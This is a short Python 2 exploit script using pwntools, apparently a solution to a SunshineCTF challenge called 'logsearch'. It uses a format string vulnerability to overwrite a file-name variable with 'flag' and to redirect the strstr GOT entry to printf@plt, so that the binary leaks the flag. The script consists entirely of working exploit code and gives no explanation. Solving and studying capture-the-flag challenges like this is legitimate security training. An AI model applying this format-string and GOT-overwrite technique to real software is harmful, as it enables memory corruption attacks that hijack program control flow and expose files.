#!/usr/bin/env python2

import struct
from pwn import *

def tube_factory():
#    return remote('chal1.sunshinectf.org', 20008)
    return process('./logsearch')

def execute_once(payload):
    tube = tube_factory()
    tube.recvuntil('phrase: ')
    tube.sendline(payload)

    tube.recvuntil('for: ')
    data = tube.recvline()

    print tube.recvall()
    return data

search_file_addr = 0x08049d7c
strstr_got_addr = 0x08049d38
printf_plt_addr = 0x080485f0

x = FmtStr(execute_once)
x.write(search_file_addr, struct.unpack('<I', 'flag')[0])
x.write(strstr_got_addr, printf_plt_addr)
x.execute_writes()
